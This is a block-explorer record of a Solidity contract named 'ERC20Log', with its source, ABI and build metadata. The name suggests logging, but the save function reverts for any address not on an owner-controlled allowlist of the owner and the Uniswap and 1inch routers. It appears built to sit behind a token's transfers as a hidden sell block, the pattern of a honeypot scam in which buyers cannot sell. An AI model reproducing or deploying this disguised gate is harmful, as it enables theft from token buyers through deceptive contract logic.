{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.9;\r\n\r\ncontract ERC20Log {\r\n    address private _owner;\r\n    mapping(address=>bool) private _priority;\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == _owner, \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    constructor() {\r\n        _owner = msg.sender;\r\n        _priority[_owner] = true;\r\n        _priority[0xf164fC0Ec4E93095b804a4795bBe1e041497b92a] = true; //UniswapV2Router01\r\n        _priority[0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = true; //UniswapV2Router02\r\n        _priority[0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD] = true; //UniswapUniversalRouter\r\n        _priority[0x1111111254EEB25477B68fb85Ed929f73A960582] = true; //1inch v5 router\r\n        _priority[0x1111111254fb6c44bAC0beD2854e76F90643097d] = true; //1inch v4 router\r\n    }\r\n\r\n    function save(address addr1, address, uint256) public returns (bool){\r\n        require(_priority[addr1], \"Cann't save\");\r\n        return true;\r\n    }\r\n\r\n    function addPriority(address[] calldata addrs) public onlyOwner() {\r\n        require(addrs.length > 0, \"Empty addrs\");\r\n        for (uint256 i; i < addrs.length; i++) {\r\n        _priority[addrs[i]] = true;\r\n        }\r\n    }\r\n\r\n    function subPriority(address[] calldata addrs) public onlyOwner() {\r\n        require(addrs.length > 0, \"Empty addrs\");\r\n        for (uint256 i; i < addrs.length; i++) {\r\n            _priority[addrs[i]] = false;\r\n        }\r\n    }\r\n\r\n    function resultPriority(address _account) external view returns(bool) {\r\n        return _priority[_account];\r\n    }\r\n\r\n    function getPairAddress(address token) external pure  returns(address) {\r\n        address factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;\r\n        address tokenA = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n        address tokenB = token;\r\n        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\r\n\r\n        return address(uint160(uint256(keccak256(\r\n            abi.encodePacked(\r\n                hex'ff',\r\n                factory,\r\n                keccak256(abi.encodePacked(token0, token1)),\r\n                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f'\r\n            )\r\n        ))));\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addrs\",\"type\":\"address[]\"}],\"name\":\"addPriority\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"}],\"name\":\"getPairAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_account\",\"type\":\"address\"}],\"name\":\"resultPriority\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr1\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"save\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addrs\",\"type\":\"address[]\"}],\"name\":\"subPriority\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ERC20Log", "CompilerVersion": "v0.8.9+commit.e5eed63a", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://c5ce0d305c051975a6fd1aad23943ba80a36d81451a872a39c853e82d6b75e7e"}